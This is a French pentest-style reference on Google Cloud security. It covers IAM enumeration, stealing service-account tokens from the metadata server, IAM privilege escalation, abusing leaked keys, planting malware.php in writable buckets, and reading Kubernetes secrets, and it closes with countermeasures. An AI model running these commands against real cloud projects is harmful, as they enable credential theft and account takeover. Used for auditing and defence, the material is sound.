---
title: GCP Security
domain: sciences-appliquées
subdomain: informatique / sécurité / cloud
tags: [gcp, google-cloud, iam, cloud-security, metadata-server, pentest, sécurité]
date: 2026-03-22
---

# GCP Security

La sécurité GCP repose principalement sur IAM (Identity and Access Management) et les Service Accounts. Les mauvaises configurations d'IAM, l'accès au metadata server depuis une VM compromise, et les clés de service account exposées constituent les vecteurs d'attaque les plus courants.

## Concepts fondamentaux GCP IAM

```
Identités :
  User Account     : compte Google personnel ou Workspace
  Service Account  : identité machine (utilisée par les VMs, Cloud Functions, etc.)
  Google Group     : groupe d'utilisateurs
  allUsers         : tout internet (dangereux si utilisé dans une policy)
  allAuthenticatedUsers : tout compte Google authentifié (dangereux)

Ressources organisées hiérarchiquement :
  Organization → Folders → Projects → Resources

Rôles :
  Primitive roles    : Owner, Editor, Viewer (trop larges, déconseillés)
  Predefined roles   : roles/storage.objectViewer (granulaires)
  Custom roles       : créés par l'organisation

Bindings IAM : {membre} a {rôle} sur {ressource}
  Héritage vers le bas : un rôle au niveau Project s'applique à toutes les ressources du projet
```

## Reconnaissance et énumération

```bash
# gcloud — outil CLI officiel GCP

# Informations sur le compte et le projet actif
gcloud auth list
gcloud config list
gcloud projects list

# Énumération IAM — qui a quoi
gcloud projects get-iam-policy PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID --format=json | \
    jq '.bindings[] | select(.role | contains("admin"))'

# Lister les Service Accounts
gcloud iam service-accounts list --project PROJECT_ID

# Permissions d'un Service Account
gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com

# Ressources accessibles
gcloud compute instances list       # VMs
gcloud storage ls                   # Buckets
gcloud sql instances list           # Cloud SQL
gcloud functions list               # Cloud Functions
gcloud run services list            # Cloud Run
gcloud container clusters list      # GKE

# Tester ses propres permissions (queryTestablePermissions)
gcloud projects test-iam-permissions PROJECT_ID \
    --permissions compute.instances.get,iam.serviceAccounts.actAs
```

```python
# Énumération avec les APIs Python — tester les permissions IAM
from google.cloud import iam_v1
from google.oauth2 import service_account

# Script pour tester toutes les permissions disponibles
import subprocess, json

def test_permissions(project, permissions):
    result = subprocess.run([
        'gcloud', 'projects', 'test-iam-permissions', project,
        '--permissions', ','.join(permissions),
        '--format', 'json'
    ], capture_output=True, text=True)
    data = json.loads(result.stdout)
    return data.get('permissions', [])

# GCP Permission Checker — outils tiers
# https://github.com/carlospolop/bf_my_gcp_permissions
```

## Metadata Server — Source clé en cas de compromission de VM

```bash
# Le metadata server GCP est accessible depuis les VMs sur : 169.254.169.254
# Il fournit des tokens OAuth2 pour le Service Account attaché à la VM

# Token OAuth2 du Service Account
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Informations sur la VM
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/"

# Récupérer tout le metadata (utile pour la reconnaissance)
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"

# Utiliser le token récupéré pour appeler les APIs GCP
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Lister les projets avec ce token
curl -H "Authorization: Bearer $TOKEN" \
    "https://cloudresourcemanager.googleapis.com/v1/projects"

# Lister les buckets
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

## Escalade de privilèges IAM

```
Vecteurs d'escalade de privilèges courants :

1. iam.serviceAccounts.actAs → Impersonner un SA plus privilégié
2. iam.serviceAccountKeys.create → Créer des clés pour un SA existant
3. iam.roles.update → Modifier un rôle custom pour ajouter des permissions
4. resourcemanager.projects.setIamPolicy → Modifier les bindings IAM du projet
5. cloudfunctions.functions.create/update → Déployer une Cloud Function avec un SA privilégié
6. compute.instances.create → Créer une VM avec un SA privilégié attaché
7. iam.serviceAccounts.implicitDelegation → Délégation de SA
```

```bash
# Escalade via iam.serviceAccounts.actAs — impersonner un SA admin
gcloud config set auth/impersonate_service_account admin-sa@PROJECT.iam.gserviceaccount.com

# Vérifier les permissions du SA impersonné
gcloud projects get-iam-policy PROJECT_ID --impersonate-service-account admin-sa@PROJECT.iam.gserviceaccount.com

# Escalade via création de clé de SA (si iam.serviceAccountKeys.create disponible)
gcloud iam service-accounts keys create key.json \
    --iam-account admin-sa@PROJECT.iam.gserviceaccount.com

# Utiliser la clé créée
gcloud auth activate-service-account --key-file=key.json

# Escalade via Cloud Function (si cloudfunctions.functions.create + actAs)
# Déployer une Cloud Function avec un SA admin
cat > /tmp/main.py << 'EOF'
import subprocess
def handler(request):
    out = subprocess.check_output(['gcloud', 'projects', 'get-iam-policy', 'PROJECT_ID'], text=True)
    return out
EOF

gcloud functions deploy evil-func \
    --runtime python39 \
    --trigger-http \
    --allow-unauthenticated \
    --source /tmp/ \
    --entry-point handler \
    --service-account admin-sa@PROJECT.iam.gserviceaccount.com
```

## Clés de Service Account exposées

```bash
# Clés SA exposées — vecteur très courant (GitHub, Docker images, S3 buckets)
# Format : JSON avec private_key_id, private_key, client_email...

# Utiliser une clé SA récupérée
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud config set project PROJECT_ID

# Identifier les permissions disponibles
gcloud projects get-iam-policy PROJECT_ID | grep CLIENT_EMAIL

# Rechercher des clés SA exposées
# Dans GitHub : filename:*.json "private_key_id"
# Dans les images Docker : docker history IMAGE | grep json
# Via des buckets publics : gsutil ls gs://BUCKET/

# Invalider une clé compromise (en tant qu'admin)
gcloud iam service-accounts keys delete KEY_ID \
    --iam-account SA@PROJECT.iam.gserviceaccount.com
```

## Bucket GCS — Mauvaises configurations

```bash
# Lister les buckets et leur accès public
gsutil ls gs://                              # Lister ses buckets
gsutil ls gs://nom-du-bucket/               # Lister le contenu
gsutil cat gs://nom-du-bucket/secret.txt    # Lire un fichier

# Vérifier les ACLs d'un bucket
gsutil iam get gs://nom-du-bucket
gsutil acl get gs://nom-du-bucket

# Scanner les buckets publics (allUsers ou allAuthenticatedUsers)
gsutil iam get gs://TARGET_BUCKET | grep "allUsers\|allAuthenticatedUsers"

# Télécharger tout le contenu d'un bucket accessible
gsutil -m cp -r gs://nom-du-bucket/ ./local-copy/

# Écriture dans un bucket (si ACL write) — backdoor
gsutil cp malware.php gs://nom-du-bucket/uploads/

# GCPBucketBrute — découverte de buckets par bruteforce de noms
python3 gcpbucketbrute.py -k KEYWORD -p PROJECT_ID -s keys.txt
```

## GKE — Kubernetes on GCP

```bash
# Cluster GKE — récupérer les credentials
gcloud container clusters get-credentials CLUSTER_NAME --region REGION

# Énumération Kubernetes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces   # Secrets Kubernetes
kubectl describe secret SECRETNAME     # Voir le contenu d'un secret

# Service Account token depuis un pod compromis
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Utiliser ce token pour appeler l'API Kube
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets/

# Metadata server depuis un pod GKE (si Workload Identity pas activé)
curl -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# → Token OAuth2 du Service Account du node → souvent compute.instanceAdmin
```

## Outils spécialisés GCP

```bash
# ScoutSuite — audit multi-cloud incluant GCP
pip install scoutsuite
scout gcp --user-account --project PROJECT_ID

# Prowler — CSPM pour GCP
pip install prowler
prowler gcp -p PROJECT_ID

# GCP Enum — énumération automatisée
python3 gcp_enum.py --project PROJECT_ID --sa-key key.json

# Hayat — scan de permissions GCP
python3 hayat.py --project PROJECT_ID

# gcp-iam-privilege-escalation (RhinoSecurity) —
# Démonstration des techniques d'escalade
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 PrivEscScanner/check_for_privesc.py

# Checkov — vérification IaC Terraform pour GCP
pip install checkov
checkov -d ./terraform/gcp/ --framework terraform
```

## Contre-mesures

```
IAM :
  ✓ Principe du moindre privilège — éviter Editor/Owner
  ✓ Désactiver les rôles primitifs (Owner, Editor) sur les projets de production
  ✓ Ne jamais utiliser allUsers ou allAuthenticatedUsers dans les bindings
  ✓ Rotation régulière des clés de Service Account
  ✓ Préférer Workload Identity Federation aux clés de SA pour les workloads externes
  ✓ Activer Workload Identity sur GKE (pas de metadata server accessible aux pods)

Service Accounts :
  ✓ Un SA par workload (pas de SA partagé)
  ✓ Désactiver la création de clés SA si non nécessaire (Organization Policy)
  ✓ Surveiller l'utilisation des clés SA (Cloud Audit Logs)
  ✓ Auditer régulièrement les SA inutilisés

Réseau et accès :
  ✓ VPC Service Controls : périmètre autour des APIs GCP (empêche l'exfiltration)
  ✓ Private Google Access : éviter l'exposition des VMs sur internet
  ✓ OS Login : authentification SSH basée sur les comptes IAM
  ✓ Shielded VMs : protection contre les rootkits au niveau firmware

Détection :
  ✓ Cloud Audit Logs : activer Data Access Logs pour toutes les APIs sensibles
  ✓ Cloud Security Command Center (SCC) : détection des mauvaises configurations
  ✓ Security Health Analytics : audit continu des configurations IAM
  ✓ Alertes sur les créations de clés SA et les modifications de bindings IAM
```
